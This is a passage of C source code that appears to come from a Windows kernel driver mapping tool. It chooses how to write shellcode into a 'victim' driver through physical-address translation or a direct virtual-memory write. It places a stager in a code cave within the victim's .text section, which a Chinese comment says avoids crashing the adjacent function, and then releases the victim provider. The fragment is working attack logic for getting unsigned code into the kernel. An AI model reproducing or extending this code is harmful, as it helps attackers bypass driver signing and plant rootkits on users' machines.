                pvShellCode,
                cbShellCode,
                sectionHandle,
                readyEventHandle,
                &enumParams);
        }
        else
            if (Context->Provider->LoadData->RootTableFromLowStub || Context->Provider->LoadData->PreferPhysical) {
                //
                // 2. Physical section access type driver with virt2phys translation available.
                //
                bSuccess = KDUpMapDriverPhysicalTranslate(Context,
                    pvShellCode,
                    cbShellCode,
                    sectionHandle,
                    readyEventHandle,
                    &vi,
                    targetAddress);

            }
            else {
                //
                // 3. Direct VM write primitive available.
                //
                {
                    ULONG caveRva = 0;
                    ULONG_PTR stagerAddress = targetAddress;

                    /*
                     * 优先把 stager 放进 .text 的填充区，只在原命中点写 5 字节 jmp。
                     * 直接覆盖命中点会把紧邻的函数一起改掉，打开设备时执行到被覆盖字节
                     * 就会在 victim 里 #UD/#DE。
                     */
                    if (KDUpFindCodeCave(Context->Victim->Data.VictimImage, cbShellCode, &caveRva)) {

                        ULONG_PTR caveAddress = vdi.LoadedImageBase + caveRva;

                        if (caveAddress >= vdi.LoadedImageBase &&
                            (caveAddress + cbShellCode) <= (vdi.LoadedImageBase + vdi.ImageSize)) {

                            stagerAddress = caveAddress;
                            printf_s("[+] Code cave: rva 0x%lX -> 0x%llX, shellcode 0x%lX bytes\r\n",
                                caveRva,
                                stagerAddress,
                                cbShellCode);
                        }
                        else {
                            supPrintfEvent(kduEventWarning,
                                "[~] Code cave 0x%lX outside victim image, using entry overwrite\r\n",
                                caveRva);
                        }
                    }
                    else {
                        supPrintfEvent(kduEventWarning,
                            "[~] No code cave for 0x%lX bytes, using entry overwrite\r\n",
                            cbShellCode);
                    }

                    bSuccess = KDUpMapDriverDirectVM(Context,
                        pvShellCode,
                        cbShellCode,
                        sectionHandle,
                        readyEventHandle,
                        targetAddress,
                        stagerAddress);
                }

            }

        if (readyEventHandle) CloseHandle(readyEventHandle);
        if (sectionHandle) NtClose(sectionHandle);

    } while (FALSE);

    //
    // Cleanup.
    //
    if (VpRelease(victimProv, NULL)) {
        printf_s("[+] Victim released\r\n");
    }

    if (pvShellCode) 
        ScFree(pvShellCode, ScSizeOf(Context->ShellVersion, NULL));

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bSuccess;
}
